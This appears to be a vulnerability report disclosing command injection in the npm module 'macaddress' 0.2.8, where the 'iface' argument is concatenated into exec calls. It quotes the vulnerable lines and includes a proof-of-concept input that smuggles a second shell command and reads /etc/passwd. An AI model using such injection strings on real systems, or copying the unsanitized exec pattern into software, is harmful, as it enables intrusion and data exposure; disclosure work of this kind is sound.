I would like to report code injection in `macaddress`
It allows to inject arbitrary shell commands if the user input can influence the `iface` argument.

# Module

**version:** 0.2.8

# Vulnerability

## Vulnerability Description

`(async)  .one(iface, callback) â†’ string` API does not escape or sanitize `iface` argument, and concatenates it to a shell command, passing it to `exec`.

Exact lines:
```
lib/linux.js:4:    exec("cat /sys/class/net/" + iface + "/address", function (err, out) {
lib/macosx.js:4:    exec("networksetup -getmacaddress " + iface, function (err, out) {
lib/unix.js:4:    exec("ifconfig " + iface, function (err, out) {
```

## Steps To Reproduce:

For Linux, use the following example:
```js
let iface = '../../../etc/passwd; touch /tmp/poof; echo ';
require('macaddress').one(iface, function (err, mac) {
  console.log("Mac address for this host: %s", mac);  
});
```

Observe `/etc/passwd` printed into the console, `/tmp/poof` file created.

For other OS, the testcase is similar.

## Supporting Material/References:
